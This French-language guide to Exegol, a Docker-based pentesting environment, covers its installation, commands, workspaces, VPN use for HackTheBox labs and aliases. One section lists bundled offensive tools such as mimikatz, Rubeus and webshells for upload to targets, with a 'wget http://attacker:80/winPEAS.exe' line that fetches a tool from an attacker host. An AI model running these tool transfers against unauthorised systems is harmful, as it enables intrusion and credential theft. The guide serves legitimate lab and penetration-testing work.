# Exegol : Environnement de Hacking basé sur Docker

`#pentest` `#docker` `#redteam` `#kali-killer`

Une alternative moderne basée sur Docker à Kali Linux pour la sécurité offensive.

---

!!! question "Pourquoi Exegol ?"
    **Le Problème Kali :**

    - VM monolithique qui casse au moindre `apt upgrade`
    - Conflits de dépendances entre les outils
    - Alourdi par des outils que vous n'utilisez jamais
    - Difficile de versionner votre configuration

    **La Solution Exegol :**

    - Conteneurs Docker jetables
    - Images d'outils immuables et versionnées
    - Workspace persistant pour vos données
    - Système hôte propre, aucune pollution

    **Avantage Clé :** *Hôte propre, pas d'enfer de dépendances, environnements entièrement versionnés.*

---

## Installation

### Prérequis

- Docker (Desktop ou Engine)
- Python 3.10+

### Installer le Wrapper Exegol

```bash
# Recommandé : Installer avec pipx (environnement isolé)
pipx install exegol

# Alternative : pip
pip install exegol --user

# Vérifier l'installation
exegol version
```

### Télécharger Votre Première Image

```bash
# Lister les images disponibles
exegol install

# Installer l'image complète (tous les outils)
exegol install full

# Ou alternatives plus légères
exegol install light   # Outils courants uniquement
exegol install ad      # Focalisé Active Directory
exegol install osint   # Outils OSINT
exegol install web     # Outils pentest web
```

---

## Aide-Mémoire des Commandes Principales

| Commande | Description |
|---------|-------------|
| `exegol install` | Lister/installer les images disponibles |
| `exegol start <name> <image>` | Créer et démarrer un conteneur |
| `exegol stop <name>` | Arrêter un conteneur en cours |
| `exegol remove <name>` | Supprimer un conteneur |
| `exegol exec <name>` | Ouvrir un nouveau shell dans un conteneur en cours |
| `exegol info` | Afficher les infos système et conteneurs |
| `exegol update` | Mettre à jour le wrapper et les images |

### Exemple de Démarrage Rapide

```bash
# Créer un conteneur nommé "htb" utilisant l'image "full"
exegol start htb full

# Vous êtes maintenant dans le conteneur avec tous les outils prêts
# Quand terminé :
exit

# Réentrer dans le même conteneur plus tard
exegol start htb
```

---

## Fonctionnalités Pro

### Le Workspace (`/workspace`)

!!! danger "Règle #1 : Toujours Sauvegarder Votre Butin dans /workspace"
    `/workspace` dans le conteneur est mappé vers un dossier sur votre **machine hôte**.

    Tout le reste dans le conteneur est **éphémère**—si vous supprimez le conteneur, c'est perdu.

```bash
# Dans le conteneur
cd /workspace

# Vos notes, exploits, captures vont ICI
mkdir notes scans exploits

# Ceci persiste même si vous détruisez le conteneur
```

**Emplacement par défaut sur l'hôte :** `~/.exegol/workspaces/<nom_conteneur>/`

### Resources (`/opt/resources`)

Outils offensifs pré-téléchargés prêts à uploader vers les cibles :

```bash
ls /opt/resources/

# Contenu inclus :
# ├── linux/
# │   ├── linpeas.sh
# │   ├── pspy64
# │   └── linux-exploit-suggester.sh
# ├── windows/
# │   ├── mimikatz/
# │   ├── winPEAS.exe
# │   ├── SharpHound.exe
# │   └── Rubeus.exe
# └── webshells/
```

```bash
# Servir vers la cible via HTTP
cd /opt/resources/windows
python -m http.server 80

# Sur la cible :
# wget http://attacker:80/winPEAS.exe
```

### Intégration VPN

Connecter votre conteneur à HackTheBox, TryHackMe, ou VPN clients :

```bash
# Démarrer un conteneur avec VPN
exegol start htb full --vpn /path/to/lab.ovpn

# Le réseau du conteneur passe par le VPN
# Le réseau de votre hôte reste intact
```

```bash
# Multiples profils VPN
exegol start client1 full --vpn ~/vpn/client1.ovpn
exegol start htb full --vpn ~/vpn/hackthebox.ovpn
```

!!! tip "VPN par engagement"
    Chaque conteneur peut avoir sa propre connexion VPN. Parfait pour séparer les engagements clients.

### Outils GUI (X11)

Exécuter des outils graphiques comme Burp Suite, Firefox :

```bash
# Linux (forwarding X11 automatique)
exegol start audit full
burpsuite &

# macOS (nécessite XQuartz)
exegol start audit full --desktop
```

### Configuration Personnalisée

```bash
# Monter des volumes supplémentaires
exegol start audit full -v /path/to/scripts:/custom

# Exposer des ports
exegol start audit full -p 8080:8080

# Mode privilégié (pour certains exploits)
exegol start audit full --privileged
```

---

## Comparaison : VM Kali vs Exegol

| Aspect | VM Kali | Exegol |
|--------|---------|--------|
| **Type** | Machine Virtuelle Complète | Conteneur Docker |
| **Taille** | 10-30 GB | 5-15 GB (image) |
| **Temps de boot** | 30-60 secondes | 1-2 secondes |
| **Mise à jour outils** | `apt upgrade` (peut casser) | Pull nouvelle image (immuable) |
| **État** | Stateful (les changements persistent) | Système stateless, données stateful |
| **Pollution hôte** | OS complet dans VM | Aucune (conteneur isolé) |
| **Multi-environnement** | Multiples VMs = lourd | Multiples conteneurs = léger |
| **Versioning** | Snapshots manuels | Tags Docker (full:2024.01) |
| **Rollback** | Restaurer snapshot | Utiliser tag d'image précédent |
| **Utilisation ressources** | Élevée (RAM, CPU réservés) | Faible (kernel partagé) |

---

## Exemple de Workflow : Machine HTB

```bash
# 1. Démarrer un conteneur frais pour la box
exegol start htb-devvortex full --vpn ~/htb/lab.ovpn

# 2. Dans le conteneur - créer la structure du workspace
cd /workspace
mkdir -p devvortex/{nmap,web,privesc}

# 3. Lancer vos scans (outils pré-installés)
nmap -sCV -oA devvortex/nmap/initial 10.10.11.xxx
feroxbuster -u http://devvortex.htb -o devvortex/web/ferox.txt

# 4. Toute la sortie sauvegardée dans /workspace (persiste sur l'hôte)

# 5. Quand terminé, le conteneur peut être supprimé
exit
exegol remove htb-devvortex
# Les données du workspace existent toujours dans ~/.exegol/workspaces/htb-devvortex/
```

---

## Alias Utiles

Ajouter à votre `~/.bashrc` ou `~/.zshrc` :

```bash
# Démarrage rapide pour scénarios courants
alias htb='exegol start htb full --vpn ~/vpn/htb.ovpn'
alias thm='exegol start thm full --vpn ~/vpn/thm.ovpn'
alias audit='exegol start audit full'

# Shell rapide dans un conteneur en cours
alias exs='exegol start'
alias exe='exegol exec'
```

!!! info "Ressources Officielles"
    - GitHub : [ThePorgs/Exegol](https://github.com/ThePorgs/Exegol)
    - Docs : [exegol.readthedocs.io](https://exegol.readthedocs.io)
    - Discord : Communauté active pour le support
